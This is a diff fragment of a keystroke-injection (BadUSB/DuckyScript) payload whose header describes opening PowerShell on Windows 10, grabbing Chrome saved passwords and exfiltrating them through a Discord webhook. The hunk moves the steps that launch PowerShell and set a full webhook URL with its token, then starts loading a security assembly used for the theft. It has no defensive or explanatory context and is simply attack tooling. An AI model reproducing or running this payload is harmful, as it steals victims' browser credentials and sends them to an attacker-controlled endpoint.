@@ -4,19 +4,13 @@ REM Description: Opens PowerShell, grabs Chrome passwords, exfils via discord we
 REM Target: Windows 10 (PowerShell + Chrome)
 REM Version: 1.0
 REM Category: Exfiltration
-DELAY 1000
-GUI r
-DELAY 250
-STRING powershell
-ENTER
-DELAY 650
-STRING $webhook='https://discordapp.com/api/webhooks/1339384272129097770/HRU1pRfC6XxJUo6FmgC79N0hcaX8b2e5x2CK-f47_83DCwT5GYSvWSXNJUKhod7z4A14'
-ENTER
 DELAY 1500
 GUI r
 DELAY 100
 STRING powershell
 ENTER
+DELAY 650
+STRING $webhook='https://discordapp.com/api/webhooks/1339384272129097770/HRU1pRfC6XxJUo6FmgC79N0hcaX8b2e5x2CK-f47_83DCwT5GYSvWSXNJUKhod7z4A14'
 DELAY 500
 STRING $d=Add-Type -A System.Security
 ENTER
